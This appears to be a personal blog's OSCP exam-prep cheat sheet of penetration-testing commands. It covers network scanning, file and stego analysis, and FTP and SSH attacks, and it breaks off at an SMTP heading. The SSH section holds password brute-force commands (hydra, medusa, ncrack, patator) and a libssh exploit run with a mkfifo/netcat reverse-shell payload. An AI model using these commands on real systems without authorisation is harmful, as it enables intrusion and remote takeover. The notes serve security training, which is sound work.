<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Sphinx</title>
    <link rel="shortcut icon" type="image/png" href="https://sfinx.kozow.com/favicon.png">
    <link rel="shortcut icon" type="image/x-icon" href="https://sfinx.kozow.com/favicon.ico">
    <link href="https://sfinx.kozow.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Sphinx Full Atom Feed" />
    <link rel="stylesheet" href="https://sfinx.kozow.com/theme/css/main.css" type="text/css" />
    <link rel="stylesheet" href="https://sfinx.kozow.com/theme/css/pygments.css" type="text/css" />
    <meta name="generator" content="Pelican" />
    <meta name="description" content="Ghost Shell, lurking throughs the realm of electronic device, find a way to break in while you being the watcher of my work. follow me alonng the journey, To the Abyss." />
    <meta name="author" content="MedSecure" />
</head>
<body>
    <header>
        <nav style="overflow: hidden;">
            <ul>
                <li class="selected"><a href="https://sfinx.kozow.com/">Home</a></li>
                <li><a href="https://github.com/Medaz-Sploit">GitHub</a></li>
                <li><a href="https://sfinx.kozow.com/authors">Authors</a></li>
                <li><a href="https://sfinx.kozow.com/categories">Categories</a></li>
            </ul>
        </nav>
        <div class="header_box" style="height: 50px">
        <h1><a href="https://sfinx.kozow.com/">
            <image src='' class="avatar" width="50px" /><span class="site_title">Sphinx</span>
            </a></h1></div>
        </div>
    </header>
    <div id="wrapper">
        <div id="content">            <h4 class="date">May 17, 2024</h4>

            <article class="post">
                <h2 class="title">
                    <a href="https://sfinx.kozow.com/oscp-notes.html" rel="bookmark" title="Permanent Link to &quot;OSCP NOTES&quot;">OSCP NOTES</a>
                </h2>

                
                

                <h1><strong>Recon</strong></h1>
<div class="highlight"><pre><span></span><code><span class="c1"># Enumerate subnet</span>
<span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sn</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.1</span><span class="o">/</span><span class="mi">24</span>

<span class="c1"># Fast simple scan</span>
<span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sS</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>

<span class="c1"># Full complete slow scan with output</span>
<span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="o">-</span><span class="n">sT</span><span class="w"> </span><span class="o">-</span><span class="n">A</span><span class="w"> </span><span class="o">-</span><span class="n">T4</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="n">Pn</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">vuln</span><span class="w"> </span><span class="o">-</span><span class="n">oA</span><span class="w"> </span><span class="n">full</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>

<span class="c1"># Autorecon</span>
<span class="n">python3</span><span class="w"> </span><span class="n">autorecon</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>

<span class="c1"># NmapAutomator</span>
<span class="n">nmapAutomator</span><span class="o">.</span><span class="n">sh</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="mf">192.168</span><span class="o">.</span><span class="mf">86.125</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="n">All</span>

<span class="c1">#Scan All the ports:</span>
<span class="n">masscan</span><span class="w"> </span><span class="o">-</span><span class="n">p1</span><span class="o">-</span><span class="mi">65535</span><span class="p">,</span><span class="n">U</span><span class="p">:</span><span class="mi">1</span><span class="o">-</span><span class="mi">65535</span><span class="w"> </span><span class="o">--</span><span class="n">rate</span><span class="o">=</span><span class="mi">1000</span><span class="w"> </span><span class="mf">192.168</span><span class="o">.</span><span class="mf">232.43</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">tun0</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">ports</span>
<span class="n">ports</span><span class="o">=$</span><span class="p">(</span><span class="n">cat</span><span class="w"> </span><span class="n">ports</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">awk</span><span class="w"> </span><span class="o">-</span><span class="n">F</span><span class="w"> </span><span class="s2">&quot; &quot;</span><span class="w"> </span><span class="s1">&#39;{print $4}&#39;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">awk</span><span class="w"> </span><span class="o">-</span><span class="n">F</span><span class="w"> </span><span class="s2">&quot;/&quot;</span><span class="w"> </span><span class="s1">&#39;{print $1}&#39;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">sort</span><span class="w"> </span><span class="o">-</span><span class="n">n</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">tr</span><span class="w"> </span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="w"> </span><span class="s1">&#39;,&#39;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">sed</span><span class="w"> </span><span class="s1">&#39;s/,$//&#39;</span><span class="p">)</span>
<span class="n">sudo</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">Pn</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">$</span><span class="n">ports</span><span class="w"> </span><span class="mf">192.168</span><span class="o">.</span><span class="mf">232.43</span>

<span class="c1"># OneTwoPunch</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">raw</span><span class="o">.</span><span class="n">githubusercontent</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">superkojiman</span><span class="o">/</span><span class="n">onetwopunch</span><span class="o">/</span><span class="k">master</span><span class="o">/</span><span class="n">onetwopunch</span><span class="o">.</span><span class="n">sh</span>
<span class="n">onetwopunch</span><span class="o">.</span><span class="n">sh</span><span class="w"> </span><span class="n">ip</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="n">tcp</span>

<span class="c1"># Scan for UDP</span>
<span class="n">nmap</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">sU</span>
<span class="n">unicornscan</span><span class="w"> </span><span class="o">-</span><span class="n">mU</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="o">-</span><span class="n">I</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>

<span class="c1"># Connect to udp if one is open</span>
<span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="mi">48772</span>

<span class="c1"># Responder</span>
<span class="n">responder</span><span class="w"> </span><span class="o">-</span><span class="n">I</span><span class="w"> </span><span class="n">eth0</span><span class="w"> </span><span class="o">-</span><span class="n">A</span>

<span class="c1"># Amass</span>
<span class="n">amass</span><span class="w"> </span><span class="k">enum</span><span class="w"> </span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.1</span><span class="o">/</span><span class="mi">24</span>
</code></pre></div>

<ul>
<li>sparta</li>
<li><code>python /root/Reconnoitre/Reconnoitre/reconnoitre.py -t 10.11.1.111 -o test --services</code></li>
</ul>
<h2>Enumeration AIO</h2>
<p><a href="http://0daysecurity.com/penetration-testing/enumeration.html">Penetration Testing Methodology - 0DAYsecurity.com</a></p>
<h2>File enumeration</h2>
<h3>Common</h3>
<div class="highlight"><pre><span></span><code><span class="c1"># Check real file type</span>
file<span class="w"> </span>file.xxx

<span class="c1"># Analyze strings</span>
strings<span class="w"> </span>file.xxx
strings<span class="w"> </span>-a<span class="w"> </span>-n<span class="w"> </span><span class="m">15</span><span class="w"> </span>file.xxx<span class="w"> </span><span class="c1"># Check the entire file and outputs strings longer than 15 chars</span>

<span class="c1"># Check embedded files</span>
binwalk<span class="w"> </span>file.xxx<span class="w"> </span><span class="c1"># Check</span>
binwalk<span class="w"> </span>-e<span class="w"> </span>file.xxx<span class="w"> </span><span class="c1"># Extract</span>

<span class="c1"># Check as binary file in hex</span>
ghex<span class="w"> </span>file.xxx

<span class="c1"># Check metadata</span>
exiftool<span class="w"> </span>file.xxx

<span class="c1"># Stego tool for multiple formats</span>
wget<span class="w"> </span>https://embeddedsw.net/zip/OpenPuff_release.zip
unzip<span class="w"> </span>OpenPuff_release.zip<span class="w"> </span>-d<span class="w"> </span>./OpenPuff
wine<span class="w"> </span>OpenPuff/OpenPuff_release/OpenPuff.exe
</code></pre></div>

<h3>Disk files</h3>
<div class="highlight"><pre><span></span><code><span class="c1"># guestmount can mount any kind of disk file</span>
sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>libguestfs-tools
guestmount<span class="w"> </span>--add<span class="w"> </span>yourVirtualDisk.vhdx<span class="w"> </span>--inspector<span class="w"> </span>--ro<span class="w"> </span>/mnt/anydirectory
</code></pre></div>

<h3>Images</h3>
<div class="highlight"><pre><span></span><code><span class="c1"># Stego</span>
wget<span class="w"> </span>http://www.caesum.com/handbook/Stegsolve.jar<span class="w"> </span>-O<span class="w"> </span>stegsolve.jar
chmod<span class="w"> </span>+x<span class="w"> </span>stegsolve.jar
java<span class="w"> </span>-jar<span class="w"> </span>stegsolve.jar

<span class="c1"># Stegpy</span>
stegpy<span class="w"> </span>-p<span class="w"> </span>file.png

<span class="c1"># Check png corrupted</span>
pngcheck<span class="w"> </span>-v<span class="w"> </span>image.jpeg

<span class="c1"># Check what kind of image is</span>
identify<span class="w"> </span>-verbose<span class="w"> </span>image.jpeg
</code></pre></div>

<h3>Audio</h3>
<div class="highlight"><pre><span></span><code><span class="c1"># Check spectrogram</span>
wget<span class="w"> </span>https://code.soundsoftware.ac.uk/attachments/download/2561/sonic-visualiser_4.0_amd64.deb
dpkg<span class="w"> </span>-i<span class="w"> </span>sonic-visualiser_4.0_amd64.deb

<span class="c1"># Check for Stego</span>
hideme<span class="w"> </span>stego.mp3<span class="w"> </span>-f<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>cat<span class="w"> </span>output.txt<span class="w"> </span><span class="c1">#AudioStego</span>
</code></pre></div>

<h2>Port 21 - FTP</h2>
<p>(https://book.hacktricks.xyz/pentesting/pentesting-ftp)</p>
<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>--script<span class="w"> </span>ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum<span class="w"> </span>-p<span class="w"> </span><span class="m">21</span><span class="w"> </span><span class="m">10</span>.11.1.111
USER<span class="w"> </span>anonymous<span class="w"> </span>/<span class="w"> </span>admin<span class="w"> </span>/<span class="w"> </span>found<span class="w"> </span>username
PASS<span class="w"> </span>anonymous<span class="w"> </span>/<span class="w"> </span>admin<span class="w"> </span>/<span class="w"> </span>found<span class="w"> </span>username
Try:
<span class="w">  </span>get<span class="w"> </span>put<span class="w"> </span><span class="o">(</span>*.aspx,*.asp,*.php<span class="o">)</span>
</code></pre></div>

<h2>Port 22 - SSH</h2>
<ul>
<li>If you have usernames test login with username:username</li>
<li>Vulnerable Versions: 7.2p1</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="n">Vulnerable</span><span class="w"> </span><span class="n">Versions</span><span class="o">:</span><span class="w"> </span><span class="mf">7.2</span><span class="n">p1</span>
<span class="n">nc</span><span class="w"> </span><span class="mf">10.11.1.111</span><span class="w"> </span><span class="mi">22</span>

<span class="n">User</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">ask</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">execute</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="n">right</span><span class="w"> </span><span class="n">after</span><span class="w"> </span><span class="n">authentication</span><span class="w"> </span><span class="n">before</span><span class="w"> </span><span class="n">it</span><span class="err">’</span><span class="n">s</span><span class="w"> </span><span class="k">default</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">executed</span>

<span class="n">$</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="n">user</span><span class="mf">@10.10.1.111</span><span class="w"> </span><span class="kt">id</span>
<span class="p">...</span>
<span class="nl">Password</span><span class="p">:</span>
<span class="nl">debug1</span><span class="p">:</span><span class="w"> </span><span class="n">Authentication</span><span class="w"> </span><span class="n">succeeded</span><span class="w"> </span><span class="p">(</span><span class="n">keyboard</span><span class="o">-</span><span class="n">interactive</span><span class="p">).</span>
<span class="n">Authenticated</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="mf">10.10.1.111</span><span class="w"> </span><span class="p">([</span><span class="mf">10.10.1.1114</span><span class="p">]</span><span class="o">:</span><span class="mi">22</span><span class="p">).</span>
<span class="nl">debug1</span><span class="p">:</span><span class="w"> </span><span class="n">channel</span><span class="w"> </span><span class="mi">0</span><span class="o">:</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="p">[</span><span class="n">client</span><span class="o">-</span><span class="n">session</span><span class="p">]</span>
<span class="nl">debug1</span><span class="p">:</span><span class="w"> </span><span class="n">Requesting</span><span class="w"> </span><span class="n">no</span><span class="o">-</span><span class="n">more</span><span class="o">-</span><span class="n">sessions</span><span class="p">@</span><span class="n">openssh</span><span class="p">.</span><span class="n">com</span>
<span class="nl">debug1</span><span class="p">:</span><span class="w"> </span><span class="n">Entering</span><span class="w"> </span><span class="n">interactive</span><span class="w"> </span><span class="n">session</span><span class="p">.</span>
<span class="nl">debug1</span><span class="p">:</span><span class="w"> </span><span class="n">pledge</span><span class="o">:</span><span class="w"> </span><span class="n">network</span>
<span class="nl">debug1</span><span class="p">:</span><span class="w"> </span><span class="n">client_input_global_request</span><span class="o">:</span><span class="w"> </span><span class="n">rtype</span><span class="w"> </span><span class="n">hostkeys</span><span class="mo">-00</span><span class="p">@</span><span class="n">openssh</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="n">want_reply</span><span class="w"> </span><span class="mi">0</span>
<span class="nl">debug1</span><span class="p">:</span><span class="w"> </span><span class="n">Sending</span><span class="w"> </span><span class="n">command</span><span class="o">:</span><span class="w"> </span><span class="kt">id</span>
<span class="nl">debug1</span><span class="p">:</span><span class="w"> </span><span class="n">client_input_channel_req</span><span class="o">:</span><span class="w"> </span><span class="n">channel</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="n">rtype</span><span class="w"> </span><span class="n">exit</span><span class="o">-</span><span class="n">status</span><span class="w"> </span><span class="n">reply</span><span class="w"> </span><span class="mi">0</span>
<span class="nl">debug1</span><span class="p">:</span><span class="w"> </span><span class="n">client_input_channel_req</span><span class="o">:</span><span class="w"> </span><span class="n">channel</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="n">rtype</span><span class="w"> </span><span class="n">eow</span><span class="p">@</span><span class="n">openssh</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="n">reply</span><span class="w"> </span><span class="mi">0</span>
<span class="o">&lt;&lt;&lt;&lt;&lt;</span><span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">user</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">100</span><span class="p">(</span><span class="n">users</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">100</span><span class="p">(</span><span class="n">users</span><span class="p">)</span><span class="o">&gt;&gt;&gt;&gt;&gt;</span>
<span class="nl">debug1</span><span class="p">:</span><span class="w"> </span><span class="n">channel</span><span class="w"> </span><span class="mi">0</span><span class="o">:</span><span class="w"> </span><span class="n">free</span><span class="o">:</span><span class="w"> </span><span class="n">client</span><span class="o">-</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">nchannels</span><span class="w"> </span><span class="mi">1</span>
<span class="nl">Transferred</span><span class="p">:</span><span class="w"> </span><span class="n">sent</span><span class="w"> </span><span class="mi">2412</span><span class="p">,</span><span class="w"> </span><span class="n">received</span><span class="w"> </span><span class="mi">2480</span><span class="w"> </span><span class="n">bytes</span><span class="p">,</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="mf">0.1</span><span class="w"> </span><span class="n">seconds</span>
<span class="n">Bytes</span><span class="w"> </span><span class="n">per</span><span class="w"> </span><span class="n">second</span><span class="o">:</span><span class="w"> </span><span class="n">sent</span><span class="w"> </span><span class="mf">43133.4</span><span class="p">,</span><span class="w"> </span><span class="n">received</span><span class="w"> </span><span class="mf">44349.5</span>
<span class="nl">debug1</span><span class="p">:</span><span class="w"> </span><span class="n">Exit</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="mi">0</span>

<span class="n">Check</span><span class="w"> </span><span class="n">Auth</span><span class="w"> </span><span class="n">Methods</span><span class="o">:</span>

<span class="n">$</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="mf">10.10.1.111</span>
<span class="n">OpenSSH_8</span><span class="mf">.1</span><span class="n">p1</span><span class="p">,</span><span class="w"> </span><span class="n">OpenSSL</span><span class="w"> </span><span class="mf">1.1.1</span><span class="n">d</span><span class="w">  </span><span class="mi">10</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">2019</span>
<span class="p">...</span>
<span class="nl">debug1</span><span class="p">:</span><span class="w"> </span><span class="n">Authentications</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="k">continue</span><span class="o">:</span><span class="w"> </span><span class="n">publickey</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="n">keyboard</span><span class="o">-</span><span class="n">interactive</span>

<span class="n">SSH</span><span class="w"> </span><span class="n">via</span><span class="w"> </span><span class="n">Non</span><span class="o">-</span><span class="n">Standard</span><span class="w"> </span><span class="n">Port</span><span class="o">:</span>

<span class="n">$</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="mf">10.10.1.111</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">43022</span>

<span class="n">SSH</span><span class="w"> </span><span class="n">no</span><span class="w"> </span><span class="n">matching</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="n">exchange</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="n">found</span><span class="o">:</span>

<span class="n">ssh</span><span class="w"> </span><span class="o">-</span><span class="n">oKexAlgorithms</span><span class="o">=+</span><span class="n">diffie</span><span class="o">-</span><span class="n">hellman</span><span class="o">-</span><span class="n">group1</span><span class="o">-</span><span class="n">sha1</span><span class="w"> </span><span class="n">bob</span><span class="mf">@10.11.1.136</span>

<span class="n">Force</span><span class="w"> </span><span class="n">Auth</span><span class="w"> </span><span class="n">Method</span><span class="o">:</span>

<span class="n">$</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="mf">10.10.1.111</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">PreferredAuthentications</span><span class="o">=</span><span class="n">password</span>
<span class="p">...</span>
<span class="nl">debug1</span><span class="p">:</span><span class="w"> </span><span class="n">Next</span><span class="w"> </span><span class="n">authentication</span><span class="w"> </span><span class="n">method</span><span class="o">:</span><span class="w"> </span><span class="n">password</span>

<span class="n">SSH</span><span class="w"> </span><span class="n">Login</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">id_rsa</span><span class="w"> </span><span class="n">file</span><span class="o">:</span>

<span class="n">$</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">id_rsa</span><span class="w"> </span><span class="n">fox</span><span class="mf">@192.168.152.126</span>

<span class="n">SSH</span><span class="w"> </span><span class="n">via</span><span class="w"> </span><span class="n">Git</span><span class="o">:</span>

<span class="n">$</span><span class="w"> </span><span class="n">GIT_SSH_COMMAND</span><span class="o">=</span><span class="err">&#39;</span><span class="n">ssh</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">id_rsa</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">IdentitiesOnly</span><span class="o">=</span><span class="n">yes</span><span class="err">&#39;</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="n">clone</span><span class="w"> </span><span class="n">ssh</span><span class="o">:</span><span class="c1">//git@192.168.212.125:43022/git-server (non-standard port)</span>

<span class="n">$</span><span class="w"> </span><span class="n">GIT_SSH_COMMAND</span><span class="o">=</span><span class="err">&#39;</span><span class="n">ssh</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="o">~/</span><span class="n">Proving_Grounds</span><span class="o">/</span><span class="n">Hunit</span><span class="o">/</span><span class="n">id_rsa</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">IdentitiesOnly</span><span class="o">=</span><span class="n">yes</span><span class="err">&#39;</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="n">push</span><span class="w"> </span><span class="p">(</span><span class="n">Done</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">within</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="n">repo</span><span class="p">)</span>

<span class="nl">BruteForce</span><span class="p">:</span>

<span class="n">patator</span><span class="w"> </span><span class="n">ssh_login</span><span class="w"> </span><span class="n">host</span><span class="o">=</span><span class="mf">10.11.1.111</span><span class="w"> </span><span class="n">port</span><span class="o">=</span><span class="mi">22</span><span class="w"> </span><span class="n">user</span><span class="o">=</span><span class="n">root</span><span class="w"> </span><span class="mi">0</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">data</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">unix_passwords</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="n">FILE0</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="n">ignore</span><span class="o">:</span><span class="n">mesg</span><span class="o">=</span><span class="err">&#39;</span><span class="n">Authentication</span><span class="w"> </span><span class="n">failed</span><span class="p">.</span><span class="err">&#39;</span>
<span class="n">hydra</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">password</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="n">ssh</span><span class="o">:</span><span class="c1">//10.10.1.111</span>
<span class="n">medusa</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="mf">10.10.1.111</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">password</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">-</span><span class="n">M</span><span class="w"> </span><span class="n">ssh</span>
<span class="n">ncrack</span><span class="w"> </span><span class="o">--</span><span class="n">user</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">password</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="n">ssh</span><span class="o">:</span><span class="c1">//10.10.1.111</span>

<span class="n">LibSSH</span><span class="w"> </span><span class="n">Before</span><span class="w"> </span><span class="mf">0.7.6</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="mf">0.8.4</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">LibSSH</span><span class="w"> </span><span class="mf">0.7.6</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">0.8.4</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Unauthorized</span><span class="w"> </span><span class="n">Access</span>
<span class="n">Id</span>
<span class="n">python</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">exploitdb</span><span class="o">/</span><span class="n">exploits</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">remote</span><span class="o">/</span><span class="mf">46307.</span><span class="n">py</span><span class="w"> </span><span class="mf">10.10.1.111</span><span class="w"> </span><span class="mi">22</span><span class="w"> </span><span class="kt">id</span>
<span class="n">Reverse</span>
<span class="n">python</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">exploitdb</span><span class="o">/</span><span class="n">exploits</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">remote</span><span class="o">/</span><span class="mf">46307.</span><span class="n">py</span><span class="w"> </span><span class="mf">10.10.1.111</span><span class="w"> </span><span class="mi">22</span><span class="w"> </span><span class="s">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.1.111 80 &gt;/tmp/f&quot;</span>

<span class="n">SSH</span><span class="w"> </span><span class="n">FUZZ</span>
<span class="nl">https</span><span class="p">:</span><span class="c1">//dl.packetstormsecurity.net/fuzzer/sshfuzz.txt</span>

<span class="n">cpan</span><span class="w"> </span><span class="n">Net</span><span class="o">::</span><span class="n">SSH2</span>
<span class="p">.</span><span class="o">/</span><span class="n">sshfuzz</span><span class="p">.</span><span class="n">pl</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="mf">10.10.1.111</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="mi">22</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">user</span>

<span class="n">use</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">fuzzers</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">ssh_version_2</span>

<span class="n">SSH</span><span class="o">-</span><span class="n">AUDIT</span>
<span class="nl">https</span><span class="p">:</span><span class="c1">//github.com/arthepsy/ssh-audit</span>

<span class="err">•</span><span class="w"> </span><span class="n">https</span><span class="o">:</span><span class="c1">//www.exploit-db.com/exploits/18557 ~ Sysax 5.53 – SSH ‘Username’ Remote Buffer Overflow</span>
<span class="err">•</span><span class="w"> </span><span class="n">https</span><span class="o">:</span><span class="c1">//www.exploit-db.com/exploits/45001 ~ OpenSSH &lt; 6.6 SFTP – Command Execution</span>
<span class="err">•</span><span class="w"> </span><span class="n">https</span><span class="o">:</span><span class="c1">//www.exploit-db.com/exploits/45233 ~ OpenSSH 2.3 &lt; 7.7 – Username Enumeration</span>
<span class="err">•</span><span class="w"> </span><span class="n">https</span><span class="o">:</span><span class="c1">//www.exploit-db.com/exploits/46516 ~ OpenSSH SCP Client – Write Arbitrary Files</span>

<span class="nl">http</span><span class="p">:</span><span class="c1">//www.vegardno.net/2017/03/fuzzing-openssh-daemon-using-afl.html</span>


<span class="n">SSH</span><span class="w"> </span><span class="n">Enum</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">7.7</span><span class="o">:</span>
<span class="nl">https</span><span class="p">:</span><span class="c1">//github.com/six2dez/ssh_enum_script</span>
<span class="nl">https</span><span class="p">:</span><span class="c1">//www.exploit-db.com/exploits/45233</span>
<span class="n">python</span><span class="w"> </span><span class="n">ssh_user_enum</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="o">--</span><span class="n">port</span><span class="w"> </span><span class="mi">2223</span><span class="w"> </span><span class="o">--</span><span class="n">userList</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">users</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="s">&quot;is a&quot;</span>
</code></pre></div>

<h2>Port 25 - SMTP</h2>
<p>https://book.hacktricks.xyz/pentesting/pentesting-smtp#basic-information</p>
<p>REF:Postfish</p>
